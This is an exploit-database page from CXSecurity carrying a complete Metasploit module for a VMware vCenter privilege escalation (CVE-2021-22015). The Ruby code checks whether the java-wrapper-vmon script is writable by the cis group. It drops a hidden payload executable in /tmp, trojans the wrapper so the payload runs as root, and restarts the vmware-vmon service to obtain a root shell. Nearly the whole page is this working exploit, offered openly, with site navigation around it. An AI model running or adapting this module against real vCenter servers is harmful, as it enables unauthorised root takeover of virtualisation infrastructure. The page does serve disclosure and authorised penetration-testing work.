---
title: VMware vCenter vScalation Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2022120013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-07
fetch_date: 2025-10-04T00:38:45.874230
---

# VMware vCenter vScalation Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VMware vCenter vScalation Privilege Escalation** **2022.12.06**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ManualRanking
include Msf::Post::Linux::Priv
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'VMware vCenter vScalation Priv Esc',
'Description' => %q{
This module exploits a privilege escalation in vSphere/vCenter due to improper permissions on the
/usr/lib/vmware-vmon/java-wrapper-vmon file. It is possible for anyone in the
cis group to write to the file, which will execute as root on vmware-vmon service
restart or host reboot.
This module was successfully tested against VMware VirtualCenter 6.5.0 build-7070488.
The following versions should be vulnerable:
vCenter 7.0 before U2c
vCenter 6.7 before U3o
vCenter 6.5 before U3q
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'Yuval Lazar' # original PoC, analysis
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'References' => [
[ 'URL', 'https://pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/' ],
[ 'CVE', '2021-22015' ],
[ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0020.html' ]
],
'DisclosureDate' => '2021-09-21',
'DefaultTarget' => 0,
'DefaultOptions' => {
'WfsDelay' => 1800 # 30min
},
'Notes' => {
'Stability' => [CRASH\_SERVICE\_DOWN],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES, IOC\_IN\_LOGS],
'AKA' => ['vScalation']
}
)
)
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
]
end
# Simplify pulling the writable directory variable
def base\_dir
datastore['WritableDir'].to\_s
end
def java\_wrapper\_vmon
'/usr/lib/vmware-vmon/java-wrapper-vmon'
end
def check
group\_owner = cmd\_exec("stat -c \"%G\" \"#{java\_wrapper\_vmon}\"")
if writable?(java\_wrapper\_vmon) && group\_owner == 'cis'
return CheckCode::Appears("#{java\_wrapper\_vmon} is writable and owned by cis group")
end
CheckCode::Safe("#{java\_wrapper\_vmon} not owned by 'cis' group (owned by '#{group\_owner}'), or not writable")
end
def exploit
# Check if we're already root
if is\_root? && !datastore['ForceExploit']
fail\_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
end
# Make sure we can write our exploit and payload to the local system
unless writable? base\_dir
fail\_with Failure::BadConfig, "#{base\_dir} is not writable"
end
# backup the original file
@backup = read\_file(java\_wrapper\_vmon)
path = store\_loot(
'java-wrapper-vmon.text',
'text/plain',
rhost,
@backup,
'java-wrapper-vmon.text'
)
print\_good("Original #{java\_wrapper\_vmon} backed up to #{path}")
# Upload payload executable
payload\_path = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}"
print\_status("Writing payload to #{payload\_path}")
upload\_and\_chmodx payload\_path, generate\_payload\_exe
register\_files\_for\_cleanup payload\_path
# write trojaned file
# we want to write our payload towards the top to ensure it gets run
# writing it at the bottom of the file results in the payload not being run
print\_status("Writing trojaned #{java\_wrapper\_vmon}")
write\_file(java\_wrapper\_vmon, @backup.gsub('#!/bin/sh', "#!/bin/sh\n#{payload\_path} &\n"))
# try to restart the service
print\_status('Attempting to restart vmware-vmon service (systemctl restart vmware-vmon.service)')
service\_restart = cmd\_exec('systemctl restart vmware-vmon.service')
# one error i'm seeing when using vsphere-client is: Failed to restart vmware-vmon.service: The name org.freedesktop.PolicyKit1 was not provided by any .service files
if service\_restart.downcase.include?('access denied') || service\_restart.downcase.include?('failed')
print\_bad('vmware-vmon service needs to be restarted, or host rebooted to obtain shell.')
end
print\_status("Waiting #{datastore['WfsDelay']} seconds for shell")
end
def cleanup
unless @backup.nil?
print\_status("Replacing trojaned #{java\_wrapper\_vmon} with original")
write\_file(java\_wrapper\_vmon, @backup)
end
super
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top